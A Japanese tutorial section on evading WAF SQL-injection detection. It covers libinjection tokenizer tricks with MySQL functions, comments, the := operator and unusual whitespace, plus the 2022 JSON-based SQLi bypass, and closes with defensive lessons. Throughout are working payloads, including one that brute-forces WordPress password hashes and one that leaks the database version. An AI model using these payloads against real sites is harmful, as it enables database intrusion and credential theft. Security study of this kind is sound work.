## 高度なフィルタ／JSONバイパス

前節までで、WAF（Web Application Firewall。HTTPリクエストを検査し、既知の攻撃パターンを遮断する防御機構）の基本的な回避手法を扱った。本節では、そこから一段踏み込んだ2つの実戦的テーマを掘り下げる。ひとつは、多くのWAFが内部で採用する**libinjection**というSQLi検知エンジンを、MySQLの文字列関数・正規表現・代入演算子を駆使して欺くboolean-baseの高度なバイパス。もうひとつは、2022年にClaroty Team82が公表し業界を揺るがした**JSONベースSQLインジェクション**——主要WAFベンダーがJSON構文をパースできないという盲点を突いた、当時「初の汎用WAFバイパス」と呼ばれた手法である。

いずれも「WAFのSQL構文解析器（パーサ）が、正規のDBエンジンと同じようには文字列を解釈できない」という**パーサの実装差**を突く点で共通している。この非対称性こそが、本節を貫く核心の原理である。

### 前提：libinjectionとは何か、なぜ狙われるのか

libinjectionは、Nick Galbreath氏が開発したオープンソースの「SQL/SQLiトークナイザ兼パーサ兼アナライザ」である。ModSecurity（OWASP Core Rule Set＝CRSの実装基盤）をはじめ、多くの商用・OSS WAFが検知エンジンとして組み込んでいる。仕組みを一言でいえば、入力文字列をSQLのトークン列（`SELECT`、`'`、`OR`、数値、演算子といった最小の意味単位）に分解し、そのトークンの並び（**指紋＝fingerprint**）が「SQLiらしいパターン」に一致するかを判定する。

ここが攻撃者にとっての狙い目になる。libinjectionは**本物のDBパーサではない**。SQL文法を完全に再現しているわけではなく、「SQLiでよく現れるトークン列の指紋」を高速にマッチングする近似器にすぎない。したがって、DBエンジンにとっては完全に有効なSQLでありながら、libinjectionのトークナイザにとっては「見慣れない・分類不能なトークン列」になるような書き方を見つければ、指紋照合がSQLiパターンにヒットせず、素通りしてしまう。以下の手法群は、すべてこの「トークナイザを混乱させる」という一点に収束する。

> ⚠️ **未取得の資料**: 「Advanced Boolean-Based SQLi WAF Bypass（Secjuice）」本文は自動取得できましたが、記事は具体的な緩和策の詳細をCRSのissue参照に留めています。原典の全文は以下から直接ご覧ください: https://www.secjuice.com/advanced-sqli-waf-bypass/

### 手法1：算術演算子による数値の書き換え

boolean-based SQLiでは、`OR 1=1` のような真偽が確定する条件式を注入するのが定石だが、この露骨な形はWAFに即座に検知される。そこで、数値リテラルそのものを算術式に置き換える。

```
id=1+1      -- 加算（URLエンコードでは %2b）
id=3-1      -- 減算
id=2*1      -- 乗算
id=2/1      -- 除算
id=2 DIV 1  -- 整数除算（MySQL固有）
```

**なぜ通るのか**：libinjectionは「明示的なboolean論理（`1=1` のような比較）」の指紋には敏感だが、算術式が絡むトークン列の評価は苦手である。`2*1` のような並びは、SQLi特有の指紋というより「ごく普通の数式」に見えるため、危険度スコアが閾値を超えない。DBエンジン側は当然これを数値 `2` として評価するので、条件式は正しく成立する。`DIV` はMySQL独自の整数除算キーワードで、標準SQLの語彙にないぶんトークナイザの分類をさらに揺さぶる。

### 手法2：MySQL文字列関数でクエリ構造を偽装する

比較演算 `=` の右辺を、値そのものではなくMySQLの文字列関数呼び出しに置き換える。関数呼び出しは括弧・カンマ・関数名という複雑なトークン列を持ち込むため、トークナイザの指紋照合を破綻させやすい。

```
/index.php?id=1 OR 1=insert(1,1,1,1)--
/index.php?id=1 OR 1=repeat(1,1)--
/index.php?id=1 OR 1=replace(1,1,1)--
/index.php?id=1 OR 1=right(1,1)--
/index.php?id=1 OR weight_string("foo")=weight_string("foo")--
```

**なぜ通るのか**：これらの関数はいずれも第一引数（や結果）が `1` や `"foo"` に評価されるため、DBエンジンでは `1=1` あるいは `"foo"="foo"` と等価な**恒真条件**として成立する。一方でlibinjectionのトークナイザは、`insert(...)` や `weight_string(...)` という関数呼び出しを含むトークン列を「よくあるSQLi指紋」に分類できず、比較演算の危険性を過小評価する。とくに `WEIGHT_STRING`（照合順序に基づくソート用のバイナリ重みを返すMySQL関数）は日常的なペイロードにまず現れないため、既存の指紋データベースから外れやすい。

- **REPEAT(str, n)**：`str` を `n` 回繰り返す。`repeat(1,1)` は `"1"` を返す。
- **REPLACE(a,b,c)**：`replace(1,1,1)` は `1` を返す。
- **RIGHT(str,n)**：`right(1,1)` は右端1文字 `"1"`。
- **INSERT(str,pos,len,new)**：部分文字列置換。

いずれも「値としては自明だが、トークン列としては複雑」という性質を利用している。

### 手法3：バックティックとインラインコメントによる分断

MySQLはバックティック（`` ` ``）で識別子を囲め、`/* ... */` でインラインコメントを書ける。これらを組み合わせてトークンの並びを分断し、WAFの正規表現パターンを外す。

```
テンプレート:  {`string`/*comment*/(<SQL syntax>)}
実例:          id={`foo`/*bar*/(select 1)}
```

**なぜ通るのか**：`` `foo` `` はバックティックで囲まれた識別子、`/*bar*/` はコメント、`(select 1)` はサブクエリ——これらが密着して並ぶと、WAFが期待する「`SELECT` の直前・直後のトークン配置」の正規表現やlibinjectionの指紋が一致しなくなる。DBエンジンはコメントを除去し、バックティック識別子とサブクエリを正しく解釈するため、`(select 1)` は実行される。中括弧 `{...}` はMySQLのODBC互換の外部結合エスケープ構文の名残で、式をグルーピングする働きを持つ。

### 手法4：RLIKEによるパスワードハッシュのブルートフォース

`RLIKE`（`REGEXP` の別名。正規表現マッチ演算子）を使うと、応答本文の長さ（真＝マッチ時と偽＝非マッチ時でレスポンスが変わる）を観測しながら、パスワードハッシュを1文字ずつ絞り込める。典型的なboolean-blindのオラクル化である。

```
id={`foo`/*bar*/(select 1 from wp_users where user_pass rlike "(^)[$].*" limit 1)}
```

反復の進め方（先頭から1文字ずつ確定させていく）：

```
"(^)[$].*"        -- ハッシュが $ で始まるか
"(^)[$][c].*"     -- 次の1文字が c か
"(^)[$][c][c].*"  -- さらに次が c か …
```

**なぜ通るのか**：`RLIKE` は真偽値を返すので、これを `WHERE` 条件に置くと「マッチすれば1行返る／しなければ0行」というオラクル（真偽の観測窓）が作れる。正規表現アンカー `^` で先頭固定し、文字クラス `[...]` を1つずつ伸ばすことで、WordPressの `wp_users.user_pass`（パスワードハッシュ）を左から順に復元できる。ペイロード全体は手法3のバックティック＋コメント分断で包まれており、`RLIKE` を含むこの条件式自体がWAF検知を回避する。

### 手法5：代入演算子 `:=` で比較を偽装する

MySQLのユーザー変数代入演算子 `:=` は、比較演算子 `=` と違い、`SELECT` 以外を含む任意のSQL文中で変数へ値を代入できる。libinjectionは `=` を「比較（SQLiの兆候）」として警戒するが、`:=` は代入であって比較ではないため、危険な比較演算とみなされにくい。

```
id=@foo:=({`if`/*bar*/(select 1 from wp_users where user_pass rlike "^[$]" limit 1)}) union %23%0a distinctrow%0b select @foo
```

**なぜ通るのか**：
- `@foo := (...)` はサブクエリの結果をユーザー変数 `@foo` に代入する。代入なので比較演算の指紋に引っかからない。
- `%23%0a` は URLエンコードされた `#`＋改行。`#` はMySQLの行コメントで、`UNION` と後続キーワードの間に改行付きコメントを挟んでトークンの隣接を崩す。
- `%0b` は垂直タブ（VT, 0x0B）。MySQLはこれを空白として扱うが、多くのWAFの正規表現は空白として想定しておらず、`distinctrow select` の間の区切りを見逃す。
- `DISTINCTROW` は `DISTINCT` の別名で、`UNION DISTINCTROW SELECT` は有効。珍しい別名を使うことでキーワードベースのシグネチャを外す。

このように、代入演算子・非標準の空白文字（`%0b`）・キーワードの別名（`DISTINCTROW`）・コメントの4つを重ねて、トークナイザと正規表現の両方を同時に外している。

> 出典: Advanced Boolean-Based SQLi WAF Bypass — https://www.secjuice.com/advanced-sqli-waf-bypass/

---

### JSONベースSQLインジェクション：主要WAFの汎用バイパス

2022年12月、Claroty Team82は「{JS-ON: Security-OFF}」と題した研究で、Palo Alto Networks・AWS・Cloudflare・F5・Imperva という5大ベンダーのWAFを**同時に破る初の汎用バイパス**を公表した。原理はシンプルかつ強力で、「SQLペイロードにJSON構文を付け足すだけ」というものである。

> 出典: WAF Bypass Using JSON-Based SQL Injection Attacks（Picus Security）— https://www.picussecurity.com/resource/blog/waf-bypass-using-json-based-sql-injection-attacks

#### 核心：DBはJSONを解釈でき、WAFはできない

PostgreSQL・MySQL・SQLite・Microsoft SQL Server といった主要RDBMSは、10年以上前からJSONを操作する演算子・関数を標準サポートしている。ところが、これらのWAF製品のSQL検査エンジンは**JSON構文を知らなかった**。libinjectionを含むトークナイザにJSON演算子（例：MySQLの `->`、PostgreSQLの `::jsonb`）を食わせると、それを「不正・未知のトークン」と判断してパースを中断してしまう。パースが途中で止まれば、その先に続く本物のSQLi構文も検査対象から外れ、WAFは「これはSQLではない」と誤判定して素通りさせる。一方でDBエンジンは、同じ文字列を完全に有効なSQLとして実行する。この**「WAFには不正・DBには正当」という非対称**が、バイパスの全メカニズムである。

Picusの解説記事が挙げる代表的なペイロードは次の1つである。

```sql
' or JSON_LENGTH("{}") <= 8896 union distinctrow select @@version#
```

**なぜ通るのか**：`JSON_LENGTH("{}")` はMySQLのJSON関数で、空オブジェクト `{}` の要素数 `0` を返す。`0 <= 8896` は常に真なので、`' or (真) union ... select @@version#` により恒真条件でUNIONインジェクションが成立し、`@@version`（DBバージョン）が漏洩する。だがWAFのトークナイザは `JSON_LENGTH("{}")` の時点でJSONリテラルを解釈できず処理を放棄するため、後続の `union ... select` を検査できない。`distinctrow` は前述同様シグネチャ回避の別名、`#` は行コメントで残りを無効化する。

#### データベース別のJSON構文

Team82の原典は、DBごとに「WAFには見慣れないが正当」なJSON構文の具体例を示している。

```sql
-- MySQL: JSON_EXTRACT でパス '$.name' の値を取り出して比較
JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan'

-- MySQL: -> 演算子（JSON_EXTRACT の糖衣構文）
'{"foo":1}' -> '$.foo'

-- PostgreSQL: ::jsonb キャストと <@（左が右に包含されるか）
'{"b":2}'::jsonb <@ '{"a":1, "b":2}'::jsonb

-- SQLite: -> 演算子とパス式（配列インデックスも可）
'{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7

-- 汎用的な注入例
1 OR JSON_EXTRACT('{"foo":1}','$.foo')=1
```

**なぜ通るのか（演算子ごとの原理）**：
- **MySQL `->` / `->>`**：`col -> '$.path'` は `JSON_EXTRACT` の、`->>` は `JSON_UNQUOTE(JSON_EXTRACT(...))` の短縮記法。`->` という2文字演算子はSQLの比較・算術演算子表にないため、トークナイザが演算子として認識できず分類に失敗する。
- **PostgreSQL `::jsonb`／`@>`／`<@`**：`::` は型キャスト、`@>`（右を含む）・`<@`（右に含まれる）はjsonb包含演算子。`'{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb` は「`{b:2}` が `{a:1,b:2}` に含まれるか」で真を返す恒真式になる。`@>` `<@` `::` のいずれもWAFの想定するSQL演算子集合の外にある。
- **SQLite `->`**：MySQL同様のパス抽出演算子で、`'$.c[2].f'` のように配列添字を含むパスも書ける。

これらはすべて「DBエンジンには標準のJSON演算子、WAFのトークナイザには未知の記号列」という同じ盲点を突いている。

#### 影響範囲と修正状況（時事性の明記）

- **公表時期**：2022年12月（Claroty Team82）。
- **影響を受けたWAF**：Palo Alto Networks、Amazon Web Services (AWS)、Cloudflare、F5 (BIG-IP ASM)、Imperva の5ベンダー。当時これらは軒並みJSON構文をSQL検査に組み込んでおらず、全滅した。
- **修正状況**：5ベンダーは通知を受け、いずれも製品のSQLインジェクション検査プロセスにJSON構文サポートを追加して修正済み。したがって**最新のWAFでは本手法はそのままでは通らない**。ただし、古いバージョンや、JSON対応が不十分な自作・OSSルールでは依然として有効な場合がある。
- **検知シグネチャ**：F5 BIG-IP ASM、ModSecurity、Palo Alto、Cisco Firepowerなどが対応シグネチャを整備した。Picus記事はJSON関数検知用シグネチャ **200102064**（"SQL-INJ JSON functions"）に言及している。OWASP CRSも2023年に「SQL in JSON」を防ぐ新ルールを追加した。

#### なぜ根本的にトークナイザが破綻するのか

libinjectionのようなトークナイザは、**有限状態機械**として文字列を1文字ずつ読み、状態遷移でトークンを切り出す。JSON演算子（`->`、`::`、`@>` など）や埋め込まれたJSONリテラル（`'{"a":1}'`）に出会うと、状態機械は「この記号列に対応する遷移が定義されていない」状態に陥る。多くの実装はこのとき「これはSQLとして解釈不能＝SQLiではない」と判断してしまう（**フェイルオープン**：検知不能なら通す挙動）。本来あるべきは「解釈不能なら疑わしいとして遮断する（フェイルクローズ）」だが、誤検知（正常なJSONを含むリクエストのブロック）を嫌って前者を選んでいたことが、汎用バイパスを許した根因である。

### まとめ：本節の一般化された教訓

本節の2つのテーマは、表面上は「MySQL関数トリック」と「JSON構文」という別物に見えるが、原理は完全に同一である。すなわち——

1. WAFのSQL検知は**本物のDBパーサではなく近似トークナイザ**である。
2. したがって「DBには有効だがトークナイザには未知・不正」な書き方は、常にバイパスの候補になる。
3. 具体的には、珍しい関数（`WEIGHT_STRING`）、非標準の空白（`%0b`）、キーワード別名（`DISTINCTROW`）、代入演算子（`:=`）、そして未対応の構文族（JSON演算子）が、その「トークナイザの死角」を作る。

防御側の教訓も明確である。ブラックリスト型のパターンマッチや近似トークナイザに依存せず、**パラメータ化クエリ（プレースホルダ）による構文とデータの根本的分離**を第一防壁とすること。WAFはあくまで多層防御の一枚であり、その検知エンジンが「DBと同じ解釈能力を持たない」という構造的限界を前提に運用しなければならない。JSONバイパスが5大ベンダーを一度に破った事実は、この限界を最も劇的に示した事例である。

> 出典: {JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF（Claroty Team82）— https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf
> 出典: WAF Bypass Using JSON-Based SQL Injection Attacks（Picus Security）— https://www.picussecurity.com/resource/blog/waf-bypass-using-json-based-sql-injection-attacks
